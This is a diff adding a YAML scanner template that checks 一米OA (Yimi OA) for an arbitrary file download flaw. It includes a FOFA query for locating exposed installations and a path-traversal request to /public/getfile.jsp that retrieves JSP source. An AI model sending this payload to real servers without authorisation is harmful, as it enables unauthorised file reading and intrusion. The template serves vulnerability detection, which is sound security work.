@@ -1,0 +1,22 @@
+id: poc-yaml-yimi-oa-getfile.jsp-anyfile-download
+info:
+  name: 一米OA getfile.jsp 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 一米OA
+  fofa: app="一米OA"
+requests:
+- method: GET
+  path: /public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,"<%@page import=\"java.io.*\" %>") &&
+
+    contains(headers,"Content-disposition") &&
+
+    contains(headers,"attachment; filename=../public/getfile.jsp")
+
+    '
+variables: {}
+transport: http
